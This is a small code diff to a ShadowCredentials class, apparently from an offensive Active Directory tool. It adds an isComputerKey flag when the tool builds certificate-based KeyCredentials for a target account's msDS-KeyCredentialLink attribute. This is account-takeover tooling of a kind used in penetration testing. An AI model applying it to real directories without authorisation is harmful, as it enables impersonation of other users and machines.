@@ -421,7 +421,7 @@ class ShadowCredentials(object):
         certificate = X509Certificate2(subject=self.target_samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
         self.logger.info("Certificate generated")
         self.logger.info("Generating KeyCredential")
-        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime(), isComputerKey=True)
         self.logger.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         if self.logger.verbosity == 2:
             keyCredential.fromDNWithBinary(keyCredential.toDNWithBinary()).show()
@@ -502,7 +502,7 @@ class ShadowCredentials(object):
             else:
                 self.target_dn = result[0]
             certificate = X509Certificate2(subject=samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
-            keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
+            keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime(), isComputerKey=True)
             self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
             results = None
             for entry in self.ldap_session.response:
